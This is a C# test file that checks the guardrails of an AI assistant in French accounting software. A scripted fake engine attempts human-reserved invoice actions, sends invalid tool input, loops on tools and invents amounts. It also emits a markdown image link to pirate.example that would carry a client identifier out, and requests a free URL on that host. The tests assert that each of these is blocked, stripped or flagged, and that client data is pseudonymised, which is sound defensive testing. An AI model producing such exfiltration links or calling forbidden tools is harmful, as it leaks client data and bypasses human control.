using Lettra.Application.Abstractions.Ai;
using Lettra.Application.Abstractions.Identity;
using Lettra.Contracts.Assistant;
using Lettra.Contracts.Common;
using static Lettra.Ai.Tests.ScriptedTurnsEngine;

namespace Lettra.Ai.Tests;

/// <summary>Garde-fous de l'orchestrateur face à un moteur qui se comporte mal (ADR-0006, ADR-0012, annexe F §10).</summary>
public sealed class AssistantGuardrailTests
{
    [Fact]
    public async Task L_IA_est_desactivee_par_defaut_et_le_moteur_n_est_jamais_appele()
    {
        ScriptedTurnsEngine engine = new(_ => Say("ne devrait pas répondre"));
        await using AssistantHarness h = new(engine);

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "Pourquoi ?");

        events.Should().ContainSingle().Which.Should().Be(new AssistantUnavailableEvent(ErrorCodes.Ai.Disabled));
        engine.Calls.Should().Be(0);
        (await h.AuditAsync()).Should().Contain(e => e.Kind == AiAuditKind.Unavailable);
    }

    [Fact]
    public async Task Sans_le_droit_IaUtiliser_l_assistant_est_indisponible()
    {
        ScriptedTurnsEngine engine = new(_ => Say("non"));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled());

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "TVA ?", permissions: new HashSet<Permission> { Permission.TiersConsulter });

        events.Should().ContainSingle().Which.Should().Be(new AssistantUnavailableEvent(SecurityErrors.ForbiddenCode));
        engine.Calls.Should().Be(0);
    }

    [Theory]
    [InlineData("Lettra:Ai:Features:0", "DraftFromText", ErrorCodes.Ai.FeatureDisabled)]
    [InlineData("Lettra:Ai:Engine", "Local", ErrorCodes.Ai.EngineUnavailable)]
    [InlineData("Lettra:Ai:ExcludedDossiers:0", "0199e3a0-0000-7000-8000-0000000000d1", ErrorCodes.Ai.DossierExcluded)]
    public async Task La_politique_du_cabinet_peut_couper_une_fonction_un_dossier_ou_le_moteur(string key, string value, string expected)
    {
        ScriptedTurnsEngine engine = new(_ => Say("non"));
        Dictionary<string, string?> settings = AssistantHarness.Enabled();
        if (key.StartsWith("Lettra:Ai:Features", StringComparison.Ordinal))
        {
            foreach (string feature in settings.Keys.Where(k => k.StartsWith("Lettra:Ai:Features", StringComparison.Ordinal)).ToList())
            {
                settings.Remove(feature);
            }
        }

        settings[key] = value;
        await using AssistantHarness h = new(engine, settings);

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "TVA ?");

        events.Should().ContainSingle().Which.Should().Be(new AssistantUnavailableEvent(expected));
        engine.Calls.Should().Be(0);
    }

    [Fact]
    public async Task Un_cabinet_peut_avoir_ses_propres_reglages()
    {
        ScriptedTurnsEngine engine = new(_ => Say("ok"));
        Dictionary<string, string?> settings = new()
        {
            [$"Lettra:Ai:Organisations:{AssistantHarness.Organisation.Value}:Enabled"] = "true",
            [$"Lettra:Ai:Organisations:{AssistantHarness.Organisation.Value}:Engine"] = "ClaudeEu",
            [$"Lettra:Ai:Organisations:{AssistantHarness.Organisation.Value}:Features:0"] = "RegulatoryQuestions",
        };
        await using AssistantHarness h = new(engine, settings);

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "TVA ?");

        events.OfType<AssistantTextEvent>().Should().ContainSingle().Which.Text.Should().Be("ok");
    }

    [Fact]
    public async Task Les_reglages_enregistres_dans_la_base_Catalog_l_emportent_sur_la_configuration()
    {
        ScriptedTurnsEngine engine = new(_ => Say("ok"));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled());

        // L'administrateur du cabinet coupe l'IA : la configuration du déploiement (activée) ne compte plus.
        await h.Settings.SaveAsync(AssistantHarness.Organisation, AiSettings.Disabled, null, Guid.NewGuid(), CancellationToken.None);
        List<AssistantEvent> refused = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "TVA ?");
        refused.Should().ContainSingle().Which.Should().BeOfType<AssistantUnavailableEvent>().Which.Code.Should().Be(ErrorCodes.Ai.Disabled);
        engine.Calls.Should().Be(0);

        // Puis il la rallume pour la seule fonction « questions réglementaires ».
        await h.Settings.SaveAsync(
            AssistantHarness.Organisation,
            new AiSettings { Enabled = true, Engine = AiEngineKind.ClaudeEu, Features = new HashSet<AssistantFeature> { AssistantFeature.RegulatoryQuestions } },
            1,
            Guid.NewGuid(),
            CancellationToken.None);
        (await h.AskAsync(AssistantFeature.RegulatoryQuestions, "TVA ?")).OfType<AssistantTextEvent>().Should().ContainSingle();
        (await h.AskAsync(AssistantFeature.EInvoicingDiagnosis, "PA ?")).Should().ContainSingle()
            .Which.Should().BeOfType<AssistantUnavailableEvent>().Which.Code.Should().Be(ErrorCodes.Ai.FeatureDisabled);
    }

    [Fact]
    public async Task Une_action_inexistante_ou_reservee_a_un_humain_est_refusee_et_journalisee()
    {
        ScriptedTurnsEngine engine = new(
            _ => Call("valider_et_emettre_facture", new { facture_id = "f1" }),
            _ => Call("supprimer_facture", new { facture_id = "f1" }, "c2"),
            _ => Say("Je ne peux pas le faire."));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled());

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.ExplainCompliance, "Valide et envoie la facture");

        events.OfType<AssistantWarningEvent>().Where(w => w.Code == ErrorCodes.Ai.ToolRejected).Select(w => w.Detail)
            .Should().Equal("valider_et_emettre_facture", "supprimer_facture");
        (await h.AuditAsync()).Count(e => e.Kind == AiAuditKind.ToolRejected).Should().Be(2);

        // L'erreur renvoyée au moteur liste les seuls outils disponibles.
        ToolResultPart result = engine.Requests[^1].Messages[^1].Parts.OfType<ToolResultPart>().Single();
        result.IsError.Should().BeTrue();
        result.Content.Should().Contain("indisponible").And.Contain("calculer");
    }

    [Fact]
    public async Task Une_entree_d_outil_invalide_est_refusee_avant_d_atteindre_l_outil()
    {
        ScriptedTurnsEngine engine = new(
            _ => Call("calculer", new { operation = "virement", parametres = new { } }),
            _ => Call("calculer", new { operation = "cca", parametres = new { total = "1200" }, executer = true }, "c2"),
            _ => Say("fin"));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled());

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "CCA ?");

        events.OfType<AssistantToolUsedEvent>().Should().HaveCount(2).And.OnlyContain(t => !t.Succeeded);
        events.OfType<AssistantRuleResultEvent>().Should().BeEmpty();
        (await h.AuditAsync()).Where(e => e.Kind == AiAuditKind.ToolRejected).Select(e => e.Detail)
            .Should().HaveCount(2).And.OnlyContain(d => d.Contains("entrée invalide", StringComparison.Ordinal));
    }

    [Fact]
    public async Task Aucun_nom_SIREN_IBAN_email_ou_adresse_ne_part_en_clair_vers_le_moteur_ni_dans_le_journal()
    {
        ScriptedTurnsEngine engine = new(
            _ => Call("calculer", new { operation = "cca", parametres = new { total = "2000", jours_n_plus_1 = "92", jours_totaux = "365" } }),
            _ => Say("fin"));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled());

        await h.AskAsync(
            AssistantFeature.ExplainCompliance,
            "Pourquoi la facture de Dupont SARL (SIREN 987654321) de 2000 € est bloquée ? IBAN FR7630006000011234567890189.",
            imported: "De : compta@dupont-sarl.fr — Jean Martin, 8 impasse des Lilas, 69100 Villeurbanne, tél. 04 72 00 00 00");

        string sent = engine.EverythingSentExceptStableInstructions();
        string journal = string.Join('\n', (await h.AuditAsync()).Select(e => e.Detail));
        string[] secrets =
        [
            "Dupont", "987654321", "FR76", "compta@dupont-sarl.fr", "Jean Martin", "WebCraft", "912345678",
            "91234567800014", "FR40912345678", "12 rue du Commerce", "04 72 00 00 00",
        ];
        foreach (string secret in secrets)
        {
            sent.Should().NotContainEquivalentOf(secret);
            journal.Should().NotContainEquivalentOf(secret);
        }

        sent.Should().Contain("[CLIENT_1]").And.Contain("2000").And.Contain("<donnees_importees>");
    }

    [Fact]
    public async Task La_reponse_est_reidentifiee_cote_serveur_et_debarrassee_des_images_et_liens_distants()
    {
        ScriptedTurnsEngine engine = new(_ => Say(
            "Le client [CLIENT_1] doit fournir son SIREN. ![suivi](https://pirate.example/p.png?d=[SIREN_1]) " +
            "[cliquez ici](https://pirate.example/collecte) ou voir [BOFiP](https://bofip.impots.gouv.fr/bofip/1.html). <img src=x>"));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled());

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "Que manque-t-il pour Dupont SARL (987654321) ?");

        string text = events.OfType<AssistantTextEvent>().Should().ContainSingle().Which.Text;
        text.Should().Contain("Dupont SARL")
            .And.NotContain("pirate.example")
            .And.NotContain("<img")
            .And.Contain("cliquez ici")
            .And.Contain("https://bofip.impots.gouv.fr/bofip/1.html");
    }

    [Fact]
    public async Task Un_calcul_est_rendu_comme_une_regle_et_un_montant_invente_est_signale()
    {
        ScriptedTurnsEngine engine = new(
            _ => Call("calculer", new { operation = "cca", parametres = new Dictionary<string, string> { ["total"] = "1200", ["jours-n-plus-1"] = "92", ["jours-totaux"] = "365" } }),
            _ => Say("La CCA est de 302,47 EUR. Pénalités estimées : 37,50 € ."));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled());

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "CCA d'une assurance de 1200 € ?");

        events.OfType<AssistantRuleResultEvent>().Should().ContainSingle().Which.Content.Should().Contain("302,47 EUR");
        AssistantWarningEvent warning = events.OfType<AssistantWarningEvent>().Should().ContainSingle(w => w.Code == ErrorCodes.Ai.UngroundedAmounts).Which;
        warning.Detail.Should().Contain("37,50").And.NotContain("302,47");
    }

    [Fact]
    public async Task Un_jeton_invente_par_le_moteur_est_signale()
    {
        await using AssistantHarness h = new(new ScriptedTurnsEngine(_ => Say("Voir aussi [CLIENT_9].")), AssistantHarness.Enabled());

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "?");

        events.OfType<AssistantWarningEvent>().Should().Contain(w => w.Code == ErrorCodes.Ai.UnknownReferences && w.Detail!.Contains("[CLIENT_9]"));
    }

    [Fact]
    public async Task Un_refus_du_moteur_est_rendu_proprement()
    {
        await using AssistantHarness h = new(new ScriptedTurnsEngine(_ => new EngineTurn([], EngineStopReason.Refusal)), AssistantHarness.Enabled());

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "?");

        events.Should().ContainSingle().Which.Should().Be(new AssistantRefusedEvent(ErrorCodes.Ai.Refused));
        (await h.AuditAsync()).Should().Contain(e => e.Kind == AiAuditKind.Refused);
    }

    [Fact]
    public async Task Une_boucle_d_outils_sans_fin_est_coupee()
    {
        ScriptedTurnsEngine engine = new(r => Call("lister_references", new { skill = "comptable" }, "c" + r.Messages.Count));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled(maxToolRounds: 3));

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "?");

        events.OfType<AssistantWarningEvent>().Should().Contain(w => w.Code == ErrorCodes.Ai.ToolRoundsExceeded);
        events[^1].Should().BeOfType<AssistantCompletedEvent>().Which.ToolRounds.Should().Be(3);
        engine.Calls.Should().Be(4);
    }

    [Fact]
    public async Task Une_fiche_lue_est_citee_et_la_fin_de_reponse_donne_le_commit_du_skill_pack()
    {
        ScriptedTurnsEngine engine = new(
            _ => Call("lire_reference", new { skill = "comptable", chemin = "facturation/mentions-obligatoires.md" }),
            _ => Say("Voir la fiche."));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled());

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "Mentions ?");

        events.OfType<AssistantCitationEvent>().Should().ContainSingle().Which.Reference
            .Should().Be("comptable/references/facturation/mentions-obligatoires.md");
        events[^1].Should().BeOfType<AssistantCompletedEvent>().Which.SkillPackCommit.Should().StartWith("f2e15c4");
    }

    [Fact]
    public async Task Un_skill_pack_de_plus_de_six_mois_est_signale()
    {
        await using AssistantHarness h = new(
            new ScriptedTurnsEngine(_ => Say("ok")),
            AssistantHarness.Enabled(),
            now: new DateTimeOffset(2026, 10, 19, 9, 0, 0, TimeSpan.Zero));

        List<AssistantEvent> events = await h.AskAsync(AssistantFeature.RegulatoryQuestions, "?");

        events[0].Should().Be(new AssistantWarningEvent(ErrorCodes.Ai.SkillPackStale, "2026-04-18"));
    }

    [Fact]
    public async Task La_consultation_web_reste_sur_les_jetons_et_ne_joint_jamais_une_adresse_libre()
    {
        RecordingHandler web = new(_ => RecordingHandler.Json("<html><body>Texte officiel</body></html>"));
        ScriptedTurnsEngine engine = new(
            _ => Call("consulter_site_officiel", new { url = "https://pirate.example/collecte" }),
            _ => Call("consulter_site_officiel", new { url = "https://impots.gouv.fr/[SIREN_1]" }, "c2"),
            _ => Call("consulter_site_officiel", new { url = "https://www.impots.gouv.fr/professionnel/facturation" }, "c3"),
            _ => Say("fin"));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled(web: true), web);

        await h.AskAsync(AssistantFeature.RegulatoryQuestions, "Calendrier de la réforme pour le SIREN 987654321 ?");

        web.Requests.Should().ContainSingle().Which.Request.RequestUri!.Host.Should().Be("www.impots.gouv.fr");
    }

    [Fact]
    public async Task Sans_reglage_du_cabinet_la_consultation_web_n_est_pas_proposee()
    {
        ScriptedTurnsEngine engine = new(_ => Say("ok"));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled(web: false));

        await h.AskAsync(AssistantFeature.RegulatoryQuestions, "?");

        engine.Requests.Single().Tools.Select(t => t.Name).Should().NotContain("consulter_site_officiel").And.Contain("calculer");
    }

    [Fact]
    public async Task Le_resultat_d_un_outil_repart_pseudonymise_vers_le_moteur()
    {
        RecordingHandler web = new(_ => RecordingHandler.Json("<html><body>Exemple : Dupont SARL, SIREN 987654321.</body></html>"));
        ScriptedTurnsEngine engine = new(
            _ => Call("consulter_site_officiel", new { url = "https://www.impots.gouv.fr/exemple" }),
            _ => Say("fin"));
        await using AssistantHarness h = new(engine, AssistantHarness.Enabled(web: true), web);

        await h.AskAsync(AssistantFeature.RegulatoryQuestions, "Exemple ?");

        ToolResultPart result = engine.Requests[^1].Messages[^1].Parts.OfType<ToolResultPart>().Single();
        result.IsError.Should().BeFalse();
        result.Content.Should().Contain("[CLIENT_1]").And.Contain("[SIREN_").And.NotContain("Dupont").And.NotContain("987654321");
    }
}
